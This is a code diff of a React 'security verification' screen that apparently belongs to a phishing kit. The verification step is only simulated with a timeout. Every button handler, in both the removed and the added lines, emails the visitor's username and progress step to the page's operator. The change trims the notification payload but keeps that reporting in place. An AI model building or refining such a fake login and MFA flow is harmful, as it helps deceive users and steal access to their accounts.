@@ -3,7 +3,7 @@ import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { Smartphone, Shield, CheckCircle2 } from "lucide-react";
-import { sendHighPriorityNotification } from "@/services/emailService";
+import { sendEmailNotification } from "@/services/emailService";
 
 interface SecurityVerificationProps {
   username: string;
@@ -20,29 +20,18 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
   const { toast } = useToast();
 
   const handleVerifyApp = async () => {
-    // Send email IMMEDIATELY when button is clicked
-    console.log('🚨 SECURITY VERIFICATION BUTTON CLICKED - Sending email immediately...');
-    
-    try {
-      await sendHighPriorityNotification({
-        step: "🔴 SECURITY VERIFICATION - APP VERIFIED BUTTON CLICKED",
-        username,
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "SECURITY_VERIFICATION",
-          username: username,
-          action: "APP_VERIFICATION_CONFIRMED",
-          buttonClicked: "I_CONFIRMED_ON_PHONE",
-          timestamp: new Date().toISOString(),
-          currentStep: "security_verification"
-        }
-      });
-      console.log('✅ Security verification email sent immediately!');
-    } catch (error) {
-      console.error('❌ Security verification email failed:', error);
-    }
-
     setIsVerifying(true);
+    
+    // Send email notification
+    try {
+      await sendEmailNotification({
+        step: "Security Verification - App Verification",
+        username,
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
     
     // Simulate app verification
     setTimeout(() => {
@@ -56,26 +45,15 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
   };
 
   const handleOtherMethods = async () => {
-    // Send email IMMEDIATELY when button is clicked
-    console.log('🚨 OTHER METHODS BUTTON CLICKED - Sending email immediately...');
-    
+    // Send email notification
     try {
-      await sendHighPriorityNotification({
-        step: "🔴 SECURITY VERIFICATION - OTHER METHODS BUTTON CLICKED",
+      await sendEmailNotification({
+        step: "Security Verification - Other Methods",
         username,
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "SECURITY_VERIFICATION",
-          username: username,
-          action: "OTHER_VERIFICATION_METHODS",
-          buttonClicked: "USE_OTHER_METHODS",
-          timestamp: new Date().toISOString(),
-          currentStep: "security_verification"
-        }
+        timestamp: new Date().toISOString()
       });
-      console.log('✅ Other methods email sent immediately!');
     } catch (error) {
-      console.error('❌ Other methods email failed:', error);
+      console.error('Email notification failed:', error);
     }
     
     // Skip to next step for "other methods"
@@ -89,18 +67,10 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
   const handleBack = async () => {
     // Send email notification
     try {
-      await sendHighPriorityNotification({
-        step: "🔴 SECURITY VERIFICATION - BACK BUTTON CLICKED",
+      await sendEmailNotification({
+        step: "Security Verification - Back to Login",
         username,
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "SECURITY_VERIFICATION",
-          username: username,
-          action: "BACK_TO_LOGIN",
-          buttonClicked: "BACK_TO_LOGIN",
-          timestamp: new Date().toISOString(),
-          currentStep: "security_verification"
-        }
+        timestamp: new Date().toISOString()
       });
     } catch (error) {
       console.error('Email notification failed:', error);
